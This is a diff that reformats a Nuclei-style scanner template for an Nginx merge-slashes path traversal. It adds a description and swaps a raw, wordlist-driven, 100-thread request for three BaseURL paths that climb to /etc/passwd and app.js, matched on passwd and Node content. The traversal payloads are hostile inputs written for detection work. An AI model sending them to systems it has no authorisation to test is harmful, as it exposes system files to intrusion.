@@ -1,44 +1,33 @@
-id: nginx-merge-slashes-path-traversal 1
+id: nginx-merge-slashes-path-traversal
+
 info:
-  author: dhiyaneshDk
   name: Nginx Merge Slashes Path Traversal
-  reference: '- https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
-
-    - https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
-
-    '
+  author: dhiyaneshDk
   severity: medium
+  description: A vulnerability in the remote Nginx server could cause the server to merge slashslash together causing what should have protected the web site from a directory traversal vulnerability into a vulnerable server.
+  reference:
+    - https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
+    - https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
   tags: exposure,config,lfi,nginx
-requests:
-- attack: sniper
-  matchers:
-  - condition: or
-    part: body
-    regex:
-    - 'root:.*:0:0:'
-    - app.listen
-    type: regex
-  - status:
-    - 200
-    type: status
-  matchers-condition: and
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-  raw:
-  - 'GET ////////../../../etc/passwd HTTP/1.1
 
-    Host: {{Subdomains}}
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}///////../../../etc/passwd"
+      - "{{BaseURL}}/static///////../../../../etc/passwd"
+      - "{{BaseURL}}///../app.js"
 
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
-    Firefox/65.0
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
 
-    Connection: close
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "app.listen"
+        part: body
+        condition: or
 
-    Accept: */*
-
-    Accept-Language: en
-
-    Accept-Encoding: gzip
-
-    '
-  threads: 100
+      - type: status
+        status:
+          - 200
